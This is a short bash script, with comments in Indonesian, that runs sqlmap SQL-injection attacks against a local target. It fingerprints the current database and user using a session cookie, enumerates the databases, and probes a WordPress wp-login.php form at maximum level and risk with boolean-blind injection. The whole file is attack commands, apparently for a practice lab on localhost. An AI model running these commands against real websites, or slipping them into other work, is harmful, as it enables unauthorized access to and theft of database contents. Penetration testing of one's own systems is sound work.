#!/bin/bash

# check jenis database dan user
sqlmap -u "http://127.0.0.1" --current-db --current-user --cookie="sess_uuid=6d8c3a08-44b2-4197-9fff-19e263cfa6d0"

# enumerasi DB
sqlmap --dbms=mysql -u "http://127.0.0.1" --dbs --cookie="sess_uuid=6d8c3a08-44b2-4197-9fff-19e263cfa6d0"

# mencoba bruteforce login
sqlmap -u 'http://127.0.0.1/wp-login.php' --data="log=testing&pwd=testing&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='mysql' --technique=B
